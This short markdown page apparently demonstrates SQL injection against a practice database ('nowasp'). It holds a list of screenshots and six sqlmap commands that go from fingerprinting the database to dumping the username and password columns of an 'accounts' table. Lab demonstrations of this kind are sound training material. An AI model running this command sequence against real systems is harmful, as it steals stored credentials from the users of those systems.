#### Add to your Blog

- Demo

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

![](images/13.png)

![](images/14.png)

![](images/15.png)

- Commands

```sh
python sqlmap.py -r req.txt --threads=10 -f
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL --dbs
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp --tables
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts --columns
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts --dump
python sqlmap.py -r req.txt --threads=10 --dbms=MySQL -D nowasp -T accounts -C username,password
```